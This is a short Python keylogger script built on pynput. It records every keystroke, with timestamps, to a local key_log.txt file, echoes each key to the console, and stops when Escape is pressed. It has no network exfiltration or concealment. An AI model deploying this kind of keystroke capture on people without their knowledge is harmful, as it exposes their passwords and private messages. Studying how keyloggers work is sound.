from pynput import keyboard

import logging

log_dir = ""

logging.basicConfig(filename=(log_dir + "key_log.txt"), level=logging.DEBUG, format='%(asctime)s: %(message)s')

def get_key_name(key):
    if isinstance(key, keyboard.KeyCode):
        return key.char
    else:
        return str(key)

def on_press(key):
    key_name = get_key_name(key)
    print('Key {} pressed'.format(key_name))
    logging.info(str(key))

def on_release(key):
    key_name = get_key_name(key)
    print('Key {} pressed'.format(key_name))

    if key_name == 'Key.esc':
        print('Exiting...')
        return False

with keyboard.Listener(
        on_press= on_press,
        on_release= on_release) as listener:
    listener.join()
